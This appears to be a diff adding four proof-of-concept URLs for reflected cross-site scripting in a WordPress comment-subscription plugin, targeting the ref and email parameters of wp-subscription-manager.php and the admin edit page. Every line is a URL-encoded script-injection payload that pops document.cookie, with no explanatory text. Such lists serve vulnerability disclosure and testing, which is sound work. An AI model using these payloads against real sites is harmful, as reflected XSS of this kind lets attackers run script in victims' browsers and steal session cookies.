@@ -1,0 +1,4 @@
+http://www.example.com/blog_path/wp-subscription-manager.php?ref=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/blog_path/wp-admin/edit.php?page=subscribe-to-comments.php&amp;ref=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/blog_path/wp-subscription-manager.php?email=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/blog_path/wp-admin/edit.php?page=subscribe-to-comments.php&amp;email=%3Cscript%3Ealert(document.cookie)%3C/script%3E
